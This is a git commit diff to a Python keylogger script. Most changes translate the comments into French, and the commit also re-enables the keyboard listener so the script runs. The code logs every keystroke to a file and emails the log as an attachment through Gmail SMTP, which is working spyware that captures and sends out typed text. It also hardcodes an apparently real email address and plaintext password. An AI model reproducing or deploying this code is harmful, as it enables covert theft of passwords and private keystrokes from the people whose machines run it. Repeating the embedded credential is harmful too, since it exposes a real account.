883cf215b71901405004cb74946ac0d79a66455b
QuentinRiv <32091703+QuentinRiv@users.noreply.github.com>
2020-09-17 18:26:50 +0200

    add comments

--- Keylogger.py
+++ Keylogger.py
@@ -11,11 +11,11 @@ import smtplib
 # Date actuelle de sauvegarde du fichier : eg. : 2020-09-17 09:26:13
 date_time = datetime.datetime.now().strftime(("%Y-%m-%d : %H-%M-%S"))
 
-# Variables :
+# Variable contenant les touches appuyées
 keys = []
 
-filename = 'myfile.txt'
-file = open(filename, 'a+')
+filename = './myfile.txt'
+file = open(filename, 'a+')     # + : crée le fichier si inexistant / a : fin du fichier
 file.write("\n\n" + date_time + "\n")
 
 
@@ -25,18 +25,18 @@ def on_press(key):
     global keys
     keys.append(str(key).replace("'", ""))
     print(keys[-1])
-    if len(keys) > 10:
+    if len(keys) > 10:      # Toutes les 10 frappes, on écrit dans le fichier
         write_keys(keys)
         keys = []
 
 def write_keys(keys):
     for key in keys:
-        if key == 'Key.enter':  # for enter it write a new line.
+        if key == 'Key.enter':          # <Enter> = nouvelle ligne
                 file.write("\n")
-        elif key == 'Key.space':#for space it will enter a space
+        elif key == 'Key.space':        # <Space> = met un espace
             file.write(key.replace("Key.space"," "))
-        elif key == 'Key.backspace':#for backspace it will enter a $
-            # EX. well$come --> welcome (Actual word) , another example hellll$$$o --> helo (actual word) [hope it helps you to understand]
+        elif key == 'Key.backspace':    # <Backspace> = on met un "$"
+            # EX. well$come --> welcome (mot correct)
             file.write(key.replace("Key.backspace", "$"))
         else:
             file.write(key)
@@ -47,9 +47,7 @@ def on_release(key):
         send_email()
         return False
 
-# also write the function to check internet connection
-# so it help to call sendmail function when internet is wroking
-
+# Vérifie si on a une connection Internet
 def is_connected():
     try:
         socket.create_connection(("www.google.com", 80))
@@ -59,48 +57,33 @@ def is_connected():
     return False
 
 def send_email():
+    # Infos pour le mail
     fromaddr = "quentin.rivollat@gmail.com"
     toaddr = "quentin.rivollat@etu.unige.ch"
     password = "U2hW3vc5"
 
     msg = MIMEMultipart()
-    # storing the senders email address
-    msg['From'] = fromaddr
-    # storing the receivers email address
-    msg['To'] = toaddr
-    # storing the subject
-    msg['Subject'] = "data"
-    # string to store the body of the mail
-    body = "TEXT YOU WANT TO SEND"
-    # attach the body with the msg instance
-    msg.attach(MIMEText(body, 'plain'))
-    # open the file to be sent
-    attachment = open(filename, "rb")
-    # instance of MIMEBase and named as part
+    msg['From'] = fromaddr              # Origine
+    msg['To'] = toaddr                  # Destinataire
+    msg['Subject'] = "data"             # Sujet
+    body = "TEXT YOU WANT TO SEND"      # Body
+    msg.attach(MIMEText(body, 'plain')) # Attache le corps
+    attachment = open(filename, "rb")   # Fichier log à envoyer
+
     part = MIMEBase('application', 'octet-stream')
-    # To change the payload into encoded form
     part.set_payload((attachment).read())
-    # encode into base64
     encoders.encode_base64(part)
     part.add_header('Content-Disposition',
                     "attachment; filename= %s" % filename)
-    # attach the instance 'part' to instance 'msg'
     msg.attach(part)
-    # creates SMTP session
-    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server = smtplib.SMTP('smtp.gmail.com', 587)    # SMTP
     server.ehlo()
-    # start TLS for security
-    server.starttls()
-    # Authentication
-    server.login(fromaddr, password)
-    # Converts the Multipart msg into a string
+    server.starttls()                               # Connexion sécurisée
+    server.login(fromaddr, password)                # Connexion au service
     text = msg.as_string()
-    # sending the mail
     server.sendmail(fromaddr, toaddr, text)
-    # terminating the session
     server.quit()
 
-# with Listener(on_press=on_press, on_release=on_release) as listener:
-#     listener.join()
-
-send_email()
+# Définit les actions à faire à l'appui de chaque touche
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
